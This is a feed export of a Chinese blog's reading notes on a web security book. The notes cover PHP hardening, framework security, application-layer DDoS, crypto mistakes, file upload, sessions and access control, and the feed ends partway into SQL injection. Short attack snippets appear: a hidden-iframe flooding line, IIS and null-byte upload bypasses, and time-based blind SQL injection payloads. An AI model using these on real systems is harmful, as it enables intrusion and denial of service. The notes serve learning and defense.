远程代码执行漏洞</li></ul><p><strong>“文件写入”执行代码</strong></p><p><strong>其他执行代码方法</strong></p><ul><li>直接执行代码的函数：eval()、assert()、system()、exec()、shell_exec()、passthru()、escapeshellcmd()、pcntl_exec()等。</li><li>文件包含：include()、include_once()、require()、require_once()。</li><li>本地文件写入：file_put_contents()、fwrite()、fputs()等。</li><li>preg_replace()代码执行：当preg_replace()的第一个参数中包含了/e时，用户无论是控制了第二个参数还是第三个参数，都可以导致代码执行。</li><li>动态函数执行</li><li>Curly Syntax：将执行花括号间的代码，并将结果替换回去。</li><li>回调函数执行代码：ob_start()等。</li><li>onserialize()导致代码执行：unserialize()这个函数将序列化的数据重新映射为PHP变量。但是在执行时如果定义了<code>__destruct()</code>函数，或者是 <code>__wakeup()</code>函数，则这两个函数将执行。</li></ul><h3 id="定制安全的PHP环境"><a href="#定制安全的PHP环境" class="headerlink" title="定制安全的PHP环境"></a>定制安全的PHP环境</h3><p>除了熟悉各种PHP漏洞外，还可以通过配置php.ini来加固PHP的运行环境。</p><ul><li>register_globals：当为ON时，PHP不知道变量从何而来，也容易出现一些变量覆盖的问题。故强烈建议register_globals=OFF</li><li>open_basedir：可以限制PHP只能操作指定目录下的文件。在对抗文件包含、目录遍历等攻击时非常有用。</li><li>allow_url_include：为了对抗文件包含，请关闭此选项，同时建议关闭allow_url_fopen。</li><li>display_errors：错误回显，一般常用于开发。推荐关闭此选项。</li><li>log_errors：在正式环境下用这个就行了，把错误信息记录在日志里。正好可以关闭错误回显。</li><li>magic_quotes_gpc：推荐关闭，不值得依赖，有若干种方法可以绕过，甚至可以衍生出新的安全问题。同时关闭它还能提高性能。</li><li>cgi.fix_pathinfo：若PHP以CGI的方式安装，则需要关闭此项，以避免出现文件解析问题。</li><li>session.cookie_httponly：开启HttpOnly。</li><li>session.cookie_secure：若是全站HTTPS则请开启此项。</li><li>safe_mode：如果是共享环境（如App Engine），则建议开启，可以和disable_functions配合使用；如果是单独的应用环境，则可以考虑关闭它，更多地依赖disable_functions控制运行环境安全。</li><li>disable_functions：能够在PHP中禁用函数。是一把双刃剑。如果是独立的应用环境，则禁用一些函数；如果是共享环境，则需要禁用更多的函数。参考新浪的SAE平台。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP安全" scheme="http://wlfsky.com/tags/PHP%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件包含漏洞" scheme="http://wlfsky.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》九</title>
    <link href="http://wlfsky.com/2018/01/28/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E4%B9%9D/"/>
    <id>http://wlfsky.com/2018/01/28/精读《白帽子讲Web安全》九/</id>
    <published>2018-01-28T11:54:27.000Z</published>
    <updated>2018-01-28T13:47:24.690Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="十二、Web框架安全"><a href="#十二、Web框架安全" class="headerlink" title="十二、Web框架安全"></a>十二、Web框架安全</h2><p>实施安全方案，要达到好的效果，必须要完后两个目标：</p><ol><li>安全方案正确、可靠；</li><li>能够发现所有可能存在的安全问题，不出现漏洞。</li></ol><h3 id="MVC框架安全"><a href="#MVC框架安全" class="headerlink" title="MVC框架安全"></a>MVC框架安全</h3><p>MVC是Model-View-Controller的缩写，他讲Web应用分为三层，View层负责用户视图、页面展示等工作；Controller负责应用的逻辑实现，接收View层传入的用户请求，并转发给对应的Model做处理；Model层则负责实现模型，完成数据的处理。</p><p>从数据的流入来看，用户提交的数据先后流经了View层、controller层、Model层，数据的流出则反过来。再设计安全方案时，要牢牢把握住数据这个关键因素。在MVC框架中，通过切片、过滤器等方式，往往能对数据进行全局处理，这为设计安全方案提供了极大的便利。</p><p>一些主要的Web安全威胁，如XSS、CSRF、SQL注入、访问控制、认证、URL跳转等不涉及业务逻辑的安全问题，都可以集中放在MVC框架中解决。</p><h3 id="模板引擎与XSS防御"><a href="#模板引擎与XSS防御" class="headerlink" title="模板引擎与XSS防御"></a>模板引擎与XSS防御</h3><p>在View层，可以解决XSS问题。XSS攻击是在用户的浏览器上执行的，其形成过程则是在服务器端页面渲染时，注入了恶意的HTML代码导致的。从MVC架构来说，是发生在View层，因此使用“输出编码”的防御方法更加合理，这意味着需要针对不同上下文的XSS攻击场景，使用不同的编码方式。</p><h3 id="Web框架与CSRF防御"><a href="#Web框架与CSRF防御" class="headerlink" title="Web框架与CSRF防御"></a>Web框架与CSRF防御</h3><p>在Web框架中可以使用security token解决CSRF攻击的问题。CSRF攻击的目标，一般会产生写数据“操作的URL，比如”增“、”删“、”改“；而”读数据“并不是CSRF攻击的目标，因为在CSRF的攻击过程中攻击者无法获取到服务器端返回的数据，攻击者只是借用户之手触发服务器动作，所以读数据对于CSRF来说并无直接的意义（但是如果同时存在XSS漏洞或者其他的跨域漏洞，则可能会引起别的问题）。</p><p>因此，在Web应用开发中，有必要对“读数据”和“写操作”予以区分，比如要求所有的“写操作”都是用HTTP POST。</p><h3 id="HTTP-Headers管理"><a href="#HTTP-Headers管理" class="headerlink" title="HTTP Headers管理"></a>HTTP Headers管理</h3><p>在Web框架中，可以对HTTP头进行全局化的处理，因此一些基于HTTP头的安全方案可以很好地实施。</p><h3 id="数据持久层与SQL注入"><a href="#数据持久层与SQL注入" class="headerlink" title="数据持久层与SQL注入"></a>数据持久层与SQL注入</h3><p>使用ORM（Object/Relation Mapping）框架对SQL注入是有积极意义的。</p><h3 id="Web框架自身安全"><a href="#Web框架自身安全" class="headerlink" title="Web框架自身安全"></a>Web框架自身安全</h3><p><strong>Struts2命令执行漏洞</strong></p><p>CVE-2010-1870</p><p><strong>Spring MVC命令执行漏洞</strong></p><p>CVE-2010-1622</p><p><strong>Django命令执行漏洞</strong></p><h2 id="十三、应用层拒绝服务攻击"><a href="#十三、应用层拒绝服务攻击" class="headerlink" title="十三、应用层拒绝服务攻击"></a>十三、应用层拒绝服务攻击</h2><h3 id="DDOS简介"><a href="#DDOS简介" class="headerlink" title="DDOS简介"></a>DDOS简介</h3><p>DDOS又称为分布式拒绝服务，全称是Distributed Denial of Service。DDOS本是利用合理的请求造成资源过载，导致服务不可用。</p><p>常见的DDOS攻击有SYN flood、UDP flood、ICMP flood等。其中SYN flood是一种最为经典的DDOS攻击。它利用了TCP协议设计中的缺陷，而TCP/IP协议是整个互联网的基础，牵一发而动全身，如今想要修复这样的缺陷几乎成为不可能的事情。</p><h3 id="应用层DDOS"><a href="#应用层DDOS" class="headerlink" title="应用层DDOS"></a>应用层DDOS</h3><p>发生在应用层，TCP三次握手已经完成，连接已经建立，所以发起攻击的IP地址也都是真实的。</p><p><strong>CC攻击</strong></p><p>CC攻击的前身是一个叫“fatboy”的攻击程序，当时黑客为了挑战绿盟的一款反DDOS设备开发了它。绿盟有一款叫“黑洞（Collaoasar）”的反DDOS设备，能够有效地清洗SYN folld等有害流量。而黑客挑衅式地将fatboy所实现的攻击方式命名为：Challenge Collapasar，简称CC，意指在黑洞的防御下，仍然能有效完成拒绝服务攻击。</p><p>CC攻击的原理非常简单，就是对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务器资源的目的。在Web应用中，查询数据库、读/写硬盘文件等操作，相对都会消耗比较多的资源。</p><p>应用层DDOS攻击还可以通过以下方式完成：在黑客入侵了一个流量很大的网站后，通过篡改页面，将巨大的用户流量分流到目标网站。比如，在大流量网站siteA上插入一段代码：</p><p><code>&lt;iframe src=&quot;http://www.example.com&quot; height=0 width=0 &gt;&lt;/iframe&gt;</code></p><p>那么所有访问该页面的siteA用户，都将对此网站发起一次HTTP GET请求，这可能直接导致网站拒绝服务。</p><p>应用层DDOS攻击是针对服务器新能的一种攻击，那么许多优化服务器性能的方法，都或多或少地能缓解此种攻击。</p><p><strong>限制请求频率</strong></p><p>最常见的针对应用层DDOS攻击的防御措施，是<strong>在应用中针对每个“客户端”做一个请求频率的限制。</strong></p><p><strong>解决应用层DDOS的几个方面：</strong></p><ul><li>应用代码要做好性能优化。合理地使用memcache就是一个很好地优化方案，将数据库的压力尽可能转移到内存中。此外还要及时的释放资源，比如及时关闭数据库连接，减少空连接等消耗。</li><li>网络架构上做好优化。善于利用负载均衡分流，避免用户流量集中在单台服务器上，同时可以充分利用好CDN和镜像站点的分流作用，缓解主站压力。</li><li>实现一些对抗手段，比如限制每个IP地址的请求频率。</li></ul><p><strong>验证码</strong></p><p>验证码是互联网中常用的技术之一，它的英文简称是CAPTCHA（Completely Automated Public Turing Test to Computers and Humans Apart，全自动区分计算机和人类的图灵测试）。</p><h3 id="防御应用层DDOS"><a href="#防御应用层DDOS" class="headerlink" title="防御应用层DDOS"></a>防御应用层DDOS</h3><p>人机识别，如验证码、客户端解析一段JavaScript，并给出正确的运行结果等。在Apache的配置文件中，有一些参数可以缓解DDOS攻击。比如调小Timeout、KeepAliveTimeout值，增加MaxClients值。但需要注意的是，这些参数的调整可能会影响到正常应用，因此所需要视情况而定。</p><p>“mod_qos”是Apache的一个Module，它可以帮助缓解应用层DDOS攻击。还有专用于对抗应用层DDOS的mod_evasive也有类似的效果。</p><h3 id="资源耗尽攻击"><a href="#资源耗尽攻击" class="headerlink" title="资源耗尽攻击"></a>资源耗尽攻击</h3><p><strong>Slowloris攻击</strong></p><p>Slowloris攻击的原理是以极低的速度往服务器发送HTTP请求。由于Web Server对于并发的连接数都有一定的上限，因此若是恶意地占用住这些连接不释放，那么Web Server的所有连接豆浆被恶意连接占用，从而无法接受新的请求，导致拒绝服务。<strong>此类拒绝服务攻击的本质，实际上是对有限资源的无限制滥用。</strong></p><p><strong>HTTP POST DOS</strong></p><p>HTTP POST DOS的原理是在发送HTTP POST包时，指定一个非常大的Content-Length值，然后以很低的速度发包，比如10~100s发一个字节，保持住这个连接不断开。这样当客户端连接数多了以后，占用住了Web Server的所有可用连接，从而导致DOS。<strong>这种攻击的本质也是针对Apache的MaxClients限制的。</strong></p><p>要解决此类问题，可以使用Web应用防火墙，或者定制一个Web Server安全模块。在安全领域，内存泄漏被认为是一种能够造成拒绝服务攻击的方式。</p><p><strong>Server Limit DOS</strong></p><p>Cookie也能造成一种拒绝服务。Web Server对HTTP包头都有长度限制，以Apache举例，默认是8192字节。也就是说，Apache所能接受的最大HTTP包头大小为8192字节（这里指的是Request Header，如果是Request Body，则默认的大小限制是2GB）。如果客户端发送的HTTP包头超过这个大小，服务器就会返回一个4xx错误。</p><p>假设攻击者通过XSS攻击，恶意地往客户端写入了一个超长的Cookie，则该客户端在清空Cookie之前，将无法再访问该Cookie所在域的任何页面。这是因为Cookie也是放在HTTP包头里发送的，而Web Server默认会认为这是一个超长的非正常请求，从而导致“客户端”的拒绝服务。</p><p><strong>ReDOS</strong></p><p>ReDOS是一种代码实现上的缺陷。正则表达式是基于NFA（Nondeterministic Finite Automaton）的，它是一个状态机，每个状态和输入符号都可能有许多不同的下一个状态。正则解析引擎将遍历所有可能的路径直到最后。由于每个状态都有若干个“下一个状态”，因此决策算法将逐个尝试每个“下一个状态”，直到找到一个匹配的。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="web框架安全" scheme="http://wlfsky.com/tags/web%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="应用层拒绝服务攻击" scheme="http://wlfsky.com/tags/%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》八</title>
    <link href="http://wlfsky.com/2018/01/28/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%85%AB/"/>
    <id>http://wlfsky.com/2018/01/28/精读《白帽子讲Web安全》八/</id>
    <published>2018-01-28T06:36:17.000Z</published>
    <updated>2018-01-28T10:36:56.376Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="十一、加密算法与随机数"><a href="#十一、加密算法与随机数" class="headerlink" title="十一、加密算法与随机数"></a>十一、加密算法与随机数</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在Web应用中，常常可以见到加密算法的身影，最常见的就是网站将敏感信息保存到Cookie时使用的加密算法。加密算法的运用是否正确，与网站的安全息息相关。</p><p>常见的加密算法通常分为：分组加密算法与流密码加密算法，两者的实现原理不同。</p><p>分组加密算法基于“<strong>分组（block）</strong>”进行操作，根据算法的不同，每个分组的长度可能不同。分组加密算法的代表有DES、3-DES、Blowfish、IDEA、AES等。</p><p>流密码加密算法，则每次只处理一个字节，密钥独立与消息之外，两者通过<strong>异或</strong>实现加密与解密。流密码加密算法的代表有：RC4、ORYX、SEAL等。</p><p>针对加密算法的攻击，一般根据攻击者能获得的信息，可以分为：</p><ul><li>唯密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><h3 id="Stream-Cipher-Attack"><a href="#Stream-Cipher-Attack" class="headerlink" title="Stream Cipher Attack"></a>Stream Cipher Attack</h3><p>流密码是常用的一种加密算法，与分组加密算法不同，流密码的加密是基于异或（XOR）操作进行的，每次只能操作一个字节。</p><p><strong>Reused Key Attack</strong></p><p>在流密码的使用中，最常见的错误便是使用同一个密钥进行多次加密/解密。这将使得破解流密码变得非常简单。这种攻击被称为“Reused Key Attack”，在这种攻击下，攻击者不需要知道密钥，即可还原出明文。</p><p><strong>Bit-flipping Attack</strong></p><p>在密码学中，攻击者在不知到明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式，被称为Bit-flipping Attack。解决Bit-flipping攻击的方法是验证密文的完整性，最常见的方法是增加带有KEY的MAC（消息验证码，Message Authentication Code），通过MAC验证密文是否被篡改。通过哈希算法来实现的MAC，称为HMAC。</p><p><strong>弱随机IV问题</strong></p><p>在authcode()函数中，它默认使用了4字节的IV（就是函数中的keyc），使得破解难度增大。但其实4字节的IV是很脆弱的，它不够随机，我们完全可以通过“暴力破解”的方式找到重复的IV。</p><h3 id="WEP破解"><a href="#WEP破解" class="headerlink" title="WEP破解"></a>WEP破解</h3><p>是一种最著名的针对流密码的攻击。WEP是一种常用的无线加密传输协议，破解了WEP的密钥，就可以以此密钥连接无线的Access Point。WEP采用RC4算法，也存在“Reused Key Attack”和“Bit-flipping Attack”攻击方式。</p><p>破解WEP的步骤：</p><ol><li>加载目标。</li><li>与目标网络进行协商。</li><li>生成密钥流。</li><li>构造ARP包。</li><li>声称自己的ARP包。</li><li>开始破解。</li></ol><h3 id="加密模式的分类"><a href="#加密模式的分类" class="headerlink" title="加密模式的分类"></a>加密模式的分类</h3><p>对于分组加密算法来说，常见的加密模式有：ECB（电码本模式）、CBC（密码分组链模式）、CFB（加密反馈模式）、OFB（输出反馈模式）、CTR（计数器模式）等。</p><p>对于ECB模式来说，改变分组密文的顺序，将改变解密后的明文顺序；替换某个分组明文，解密后该对应分组的明文也会被替换，而其他分组不受影响。</p><p>当需要加密的明文多于一个分组的长度时，应该避免使用ECB模式，而使用其他更加安全的加密模式。</p><h3 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h3><p>针对CBC模式的攻击。它可以在不知道密钥的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文。</p><h3 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h3><p>在密码学里有个基本的原则：<strong>密码系统的安全性应该依赖于密钥的复杂性，而不应该依赖于算法的保密性。</strong></p><p><strong>密钥管理中最常见的错误，就是讲密钥硬编码在代码里。</strong></p><h3 id="伪随机数问题"><a href="#伪随机数问题" class="headerlink" title="伪随机数问题"></a>伪随机数问题</h3><p>伪随机数不够随机，是程序开发中会出现的一个问题。伪随机数，是通过一些数学算法生成的随机数，并非真正的随机数。</p><p>很多伪随机数算法与系统时间有关，这样生成的随机数是根据时间顺序增长的，可以从时间上进行预测，从而存在安全隐患。所以在开发中要切记：<strong>不要把时间函数当成随机数使用。</strong></p><p><strong>破解伪随机数算法的种子</strong></p><p>在PHP中，常用的随机数生成算法有rand()、my_rand()。这两个函数的最大范围分别为：32767和2147483647。可见，rand()的范围其实是很小的，如果使用rand()生成的随机数用于一些重要的地方，则会非常危险。</p><p>伪随机数是由数学算法实现的，它真正随机的地方在于“种子（seed）”。种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得值的顺序也是固定的。</p><p>攻击方法：</p><ol><li>通过一些方法猜解出种子的值；</li><li>通过mt_rand()对猜解出的种子值进行播种；</li><li>通过还原程序逻辑，计算出对应的mt_rand()产生的伪随机数的值。</li></ol><p><strong>使用安全的随机数</strong></p><p>在重要或敏感的系统中，一定要使用足够强壮的随机数生成算法。</p><p>在加密算法的选择和使用上，有以下最佳实践：</p><ol><li>不要使用ECB模式；</li><li>不要使用流密码（比如RC4）；</li><li>使用HMAC-SHA 1代替MD5（甚至是代替SHA 1）；</li><li>不要使用相同的key做不同的事情；</li><li>salts与IV需要随机产生；</li><li>不要自己实现加密算法，尽量使用安全专家已经实现好的库；</li><li>不要依赖系统的保密性。</li></ol><p>当你不知道该如何选择时，有以下建议：</p><ol><li>使用CBC模式的AES256用于加密；</li><li>使用HMAC-SHA512用于完整性检查；</li><li>使用带salt的SHA-256或SHA-512用于Hashing。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="加密算法与随机数" scheme="http://wlfsky.com/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》七</title>
    <link href="http://wlfsky.com/2018/01/28/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E4%B8%83/"/>
    <id>http://wlfsky.com/2018/01/28/精读《白帽子讲Web安全》七/</id>
    <published>2018-01-28T03:13:44.000Z</published>
    <updated>2018-01-29T15:17:55.272Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="八、文件上传漏洞"><a href="#八、文件上传漏洞" class="headerlink" title="八、文件上传漏洞"></a>八、文件上传漏洞</h2><p><strong>文件上传漏洞概述</strong></p><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</p><p>文件上传后导致的常见安全问题一般有：</p><ul><li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</li><li>上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为（其他通过类似方式控制策略文件的情况类似）；</li><li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行；</li><li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li></ul><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过“本地文件包含漏洞（Local File Include）”执行此脚本等等。</p><p><strong>绕过文件上传检查功能</strong></p><p>绕过文件上传检查功能的方法一般有如下几种：</p><ul><li><p>通过判断文件名后缀的方法来验证文件的安全性；</p></li><li><p>通过手动修改上传过程中的POST包，在文件名后添加一个%00字节，则可以截断某些函数对文件名的判断；</p></li><li><p>通过判断上传文件的文件头来验证文件的类型，浏览器的MIME Sniff功能实际上也是通过读取文件的前256个字节，来判断文件的类型的。</p></li></ul><p><strong>Apache文件解析问题</strong></p><p>Apache 1.x、2.x中，对文件名的解析就存在以下特性。</p><p>Apache对于文件名的解析是从后往前解析的，直到遇见一个Apache认识的文件类型为止。比如：phpshell.php.rar.rar.rar，因为Apache不认识rar文件类型，所以会一直遍历到.php，然后认为这是一个php类型的文件。Apache的认识文件类型定义在mime.types文件中。</p><p><strong>IIS文件解析问题</strong></p><p>IIS6在处理文件解析时，当文件名为abc.asp;xx.jpg时，IIS6会将文件解析为abc.asp，文件名被阶段了，从而导致脚本被执行。比如：<a href="">http://www.target.com/path/xyz.asp;abc.jpg</a>，这个abc.jpg，会被当做ASP文件进行解析。还有支持PUT功能导致的若干问题。</p><p><strong>设计安全的文件上传功能</strong></p><ul><li>文件上传的目录设置为不可执行</li><li>判断文件类型</li><li>使用随机数改写文件名和文件路径</li><li>单独设置文件服务器的域名</li></ul><h2 id="九、认证与会话管理"><a href="#九、认证与会话管理" class="headerlink" title="九、认证与会话管理"></a>九、认证与会话管理</h2><p><strong>认证的目的是为了认出用户是谁，而授权的目的是为了决定用户能够做什么。</strong></p><p>认证实际上就是验证凭证的过程。</p><p><strong>密码策略：</strong></p><p>密码长度方面：</p><ul><li><p>普通应用要求长度为6位以上；</p></li><li><p>重要应用要求长度为8位以上，并考虑双因素认证。</p></li></ul><p>密码复杂度方面：</p><ul><li><p>密码区分大小写字母；</p></li><li><p>密码为大写字母、小写字母、数字、特殊符号两种以上的组合；</p></li><li><p>不要有连续性的字符，比如1234abcd，这种字符顺着人的思路，所以很容易猜解；</p></li><li><p>尽量避免出现重复的字符，比如1111。</p></li></ul><p>密码必须以不可逆的加密算法，或者是单向散列函数算法，加密后存储在数据库中。一般将明文密码经过哈希后（比如MD5或者SHA-1）再保存到数据库中。为防止密码哈希值泄露后，黑客能够直接通过<strong>彩虹表</strong>查询出密码明文，在计算密码明文的哈希值时，增加一个“Salt”。”Salt”是一个随机字符串，这种方法称为“口令撒盐”。Salt应该保存在服务器端的配置文件中，并妥善保管。</p><p><strong>多因素认证</strong></p><p>除了密码外，手机动态口令、数字证书、第三方证书等都可以用于用户的认证。多因素攻击提高了攻击的门槛与攻击成本。</p><p><strong>Session认证</strong></p><p>密码与证书等认证手段，一般仅仅用于登录（Login）的过程。当登陆完成后，用户访问网站的页面，不可能每次浏览器请求页面时都再次使用密码认证一次。因此，当认证成功后，就需要替换一个对用户透明的凭证。这个凭证就是SessionID。</p><p>当用户完成登录后，在服务器端就会创建一个新的会话（Session），会话中会保存用户的状态和相关信息。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。最常见的做法就是把SessionID加密后保存在Cookie中，因为Cookie会随着HTTP请求头发送，且受到浏览器同源策略的保护。</p><p>Session一旦在生命周期内被窃取，就等同于账户失窃。Session劫持就是一种通过窃取用户SessionID后，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionID是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID也可以保存在URL中，但是这种方式的安全性难以经受考验。</p><p>在生成SessionID时，需要保证足够的随机性。</p><p><strong>Session Fixation攻击</strong></p><p>登录前后用户的SessionID没有发生变化导致的攻击。</p><p>解决Session Fixation的正确做法是，在登陆完成后，重写SessionID。</p><p><strong>Session保持攻击</strong></p><p>通过不停地发起访问请求，让Session一直不失效。解决方法是，在一定时间后强制销毁Session。还要考虑的是同一用户可以同时拥有几个有效Session。若每个用户只允许拥有一个Session，则攻击者想要一直保持一个Session也是不太可能的。当用户再次登录时，攻击者所保持的Session将被“踢出”。</p><p><strong>单点登录（SSO）</strong></p><p>单点登录的英文全称为Single Sign On，简称SSO。他希望用户只需要登录一次，就可以访问所有的系统。目前最流行的单点登录系统是OpenID。</p><h2 id="十、访问控制"><a href="#十、访问控制" class="headerlink" title="十、访问控制"></a>十、访问控制</h2><p>权限控制，或者说访问控制，广泛应用于各个系统中。抽象地说，<strong>都是某个主体（subject）对某个客体（object）需要实施某种操作（operation），而系统对这种操作的限制就是权限控制。</strong></p><p>在一个安全系统中，确定主体的身份是“认证”解决的问题；而客体是一种资源，是主体发起的请求的对象。在主体对客体进行操作的过程中，系统控制主体不能“无限制“地对客体进行操作，这个过程就是”访问控制”。</p><p>主体“能够做什么”，就是权限。在Linux的文件系统中，将权限分为“读”、“写”、 “执行”三种能力。</p><p>在Web应用中，根据访问客体的不同，常见的访问控制可以分为“基于URL的访问控制”、“基于方法（method）的访问控制”和“基于数据的访问控制”。</p><p><strong>垂直权限管理</strong></p><p>访问控制实际上就是建立用户与权限之间的对应关系，现在应用广泛的一种方法，就是“基于角色的访问控制（Role-Based Access Control）”，简称RBAC。</p><p>这种基于角色的权限管理（RBAC模型），我们可以称为“垂直权限管理”。</p><p>在配置权限时，应当使用“最小权限原则”，并使用“默认拒绝”的策略，只对有需要的主体单独配置“允许”的策略。这在很多时候能够避免发生“越权访问”。</p><p><strong>水平权限管理</strong></p><p>相对于垂直权限管理来说，水平权限问题出在同一个角色上。系统只验证了能访问数据的角色，既没有对角色内的用户做细分，也没有对数据的子集做细分，因此缺乏一个用户到数据之间的对应关系。由于水平权限管理使系统缺乏一个数据级的访问控制所造成的，因此水平权限管理称之为“基于数据的访问控制”。</p><p><strong>OAuth简介</strong></p><p>OAuth是一个在不提供用户名和密码的情况下，授权第三方应用访问Web资源的安全协议。常见的应用OAuth的场景，一般是某个网站想要获取到一个用户在第三方网站中的某些资源或服务。</p><p>在OAuth 1.0 中，涉及3个角色，分别是：</p><ul><li>Consumer：消费方（Client）</li><li>Service Provider：服务方（Server）</li><li>User：用户（Resource Owner）</li></ul><p><strong>权限管理的黄金法则就是满足“最小权限原则”。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件上传" scheme="http://wlfsky.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="认证与会话管理" scheme="http://wlfsky.com/tags/%E8%AE%A4%E8%AF%81%E4%B8%8E%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/"/>
    
      <category term="访问控制" scheme="http://wlfsky.com/tags/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》六</title>
    <link href="http://wlfsky.com/2018/01/26/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%85%AD/"/>
    <id>http://wlfsky.com/2018/01/26/精读《白帽子讲Web安全》六/</id>
    <published>2018-01-26T06:57:31.000Z</published>
    <updated>2018-01-26T09:38:39.694Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="七、注入攻击"><a href="#七、注入攻击" class="headerlink" title="七、注入攻击"></a>七、注入攻击</h2><p>注入攻击的本质是<strong>把用户输入的数据当做代码执行。</strong>这里有两个关键条件，第一个是<strong>用户能够控制输入；</strong>第二个是<strong>原本程序要执行的代码，拼接了用户输入的数据。</strong></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><strong>盲注（Blind Injection）</strong></p><p><strong>Timing Attack</strong></p><p>MYSQL：BENCHMARK(10000000, md5(1)) or SLEEP(5)</p><p>PostgreSQL：PG_SLEEP(5) or GENERATE_SERIES(1, 1000000)</p><p>MS SQL Server：WAITFOR DELAY ‘0:0:5’</p><h3 id="数据库攻击技巧"><a href="#数据库攻击技巧" class="headerlink" 